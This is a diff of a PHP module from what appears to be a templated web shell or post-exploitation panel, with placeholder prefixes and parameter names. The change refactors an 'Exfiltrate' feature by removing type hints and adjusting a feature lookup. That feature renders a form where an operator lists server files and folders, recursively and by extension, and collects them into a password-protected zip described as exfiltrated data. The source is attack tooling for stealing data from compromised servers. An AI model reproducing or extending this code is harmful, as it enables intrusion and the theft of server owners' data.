@@ -14,33 +14,33 @@ $EXFILTRATE = "__FEAT_EXFILTRATE__";
  * @param $page string The current page
  * @param $css string The CSS of the page
  */
-function __PREFIX__makeExfiltratePage(&$page_content, array $features, $page, $css): void {
+function __PREFIX__makeExfiltratePage(&$page_content, $features, $page, $css) {
+    $feature = array_values(array_filter($features, fn($feature) => $feature["op"] === $page));
+
     $page_content = __PREFIX__makePage(
         $features,
         $css,
         $page,
         [
             __PREFIX__makePageHeader(
-                $features[$page]["title"],
-                $features[$page]["description"]
+                $feature[0]["title"],
+                $feature[0]["description"]
             ),
             __PREFIX__makeForm(
                 $page,
                 $_SERVER["REQUEST_URI"],
-                [
-                    __PREFIX__makeInput(
-                        "textarea",
-                        "Paths",
-                        "__PARAM_1__",
-                        "C://path/to/file1.txt\nC://path/to/file2.txt\nC://path/to/folder1\nC://path/to/folder2,with_tree\nC://path/to/folder3,with_tree,extensions=txt|doc|xlsx",
-                        "List of file/folders to include in the zip archive.<br/>" .
-                        "Concatenate to the path " . __PREFIX__makeCodeHighlight(",with_tree") .
-                        " to include all files and folders within a given directory.<br/>" .
-                        "Concatenate to the path " . __PREFIX__makeCodeHighlight(",extensions=txt|doc|xlsx") .
-                        " to include only files with the given extensions.",
-                        true
-                    ),
-                ]
+                [__PREFIX__makeInput(
+                    "textarea",
+                    "Paths",
+                    "__PARAM_1__",
+                    "C://path/to/file1.txt\nC://path/to/file2.txt\nC://path/to/folder1\nC://path/to/folder2,with_tree\nC://path/to/folder3,with_tree,extensions=txt|doc|xlsx",
+                    "List of file/folders to include in the zip archive.<br/>" .
+                    "Concatenate to the path " . __PREFIX__makeCodeHighlight(",with_tree") .
+                    " to include all files and folders within a given directory.<br/>" .
+                    "Concatenate to the path " . __PREFIX__makeCodeHighlight(",extensions=txt|doc|xlsx") .
+                    " to include only files with the given extensions.",
+                    true
+                )]
             ),
             // if a request with the status parameter is received create the command output screen and render the status
             empty($_GET["status"])
@@ -56,8 +56,10 @@ function __PREFIX__makeExfiltratePage(&$page_content, array $features, $page, $c
  * Get the shortest common path from a list of paths
  *
  * @param $paths string[] List of paths
+ *
+ * @return string|null
  */
-function __PREFIX__getShortestCommonPath($paths): ?string {
+function __PREFIX__getShortestCommonPath($paths) {
     if (empty($paths)) {
         return null;
     }
@@ -96,8 +98,10 @@ function __PREFIX__getShortestCommonPath($paths): ?string {
  * @param $recursive bool Whether to add the directory recursively
  * @param $extensions string[] Extensions to include
  * @param $cleanup_path string Path to cleanup
+ *
+ * @return void
  */
-function __PREFIX__addDirectoryToZip($dir, $zip, $recursive, $extensions, $cleanup_path = ""): void {
+function __PREFIX__addDirectoryToZip($dir, $zip, $recursive, $extensions, $cleanup_path = "") {
     $dir_handle = opendir($dir);
 
     while (($file = readdir($dir_handle)) !== false) {
@@ -137,10 +141,11 @@ function __PREFIX__addDirectoryToZip($dir, $zip, $recursive, $extensions, $clean
  * Handle the zip creation process
  *
  * @param $operation string The operation to handle
- * @param $features array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
- *     container
+ * @param $features array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features container
+ *
+ * @return void
  */
-function __PREFIX__handleExfiltrate($operation, $features): void {
+function __PREFIX__handleExfiltrate($operation, $features) {
     $content = $_POST['__PARAM_1__'];
 
     // ensure the zip extension is loaded
@@ -233,8 +238,10 @@ function __PREFIX__handleExfiltrate($operation, $features): void {
  * Hook the isolated operations to add the current operation
  *
  * @param $isolated_ops array The isolated operations container
+ *
+ * @return void
  */
-function __PREFIX__exfiltrateHooksIsolatedOps(&$isolated_ops): void {
+function __PREFIX__exfiltrateHooksIsolatedOps(&$isolated_ops) {
     global $EXFILTRATE;
 
     $isolated_ops[] = $EXFILTRATE;
@@ -245,18 +252,15 @@ function __PREFIX__exfiltrateHooksIsolatedOps(&$isolated_ops): void {
  *
  * @param $features array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
  *     container
+ *
+ * @return void
  */
-function __PREFIX__exfiltrateHooksFeatures(&$features): void {
+function __PREFIX__exfiltrateHooksFeatures(&$features) {
     global $EXFILTRATE;
 
-    $features[] = [
-        "title"       => "Exfiltrate",
-        "description" => "Exfiltrate data from the server in a password protected zip archive.",
-        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
+    $features[] = ["title"       => "Exfiltrate", "description" => "Exfiltrate data from the server in a password protected zip archive.", "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
   <path stroke-linecap="round" stroke-linejoin="round" d="M3 16.5v2.25A2.25 2.25 0 0 0 5.25 21h13.5A2.25 2.25 0 0 0 21 18.75V16.5M16.5 12 12 16.5m0 0L7.5 12m4.5 4.5V3" />
-</svg>',
-        "op"          => $EXFILTRATE,
-    ];
+</svg>', "op"          => $EXFILTRATE];
 }
 
 // section.functions.end
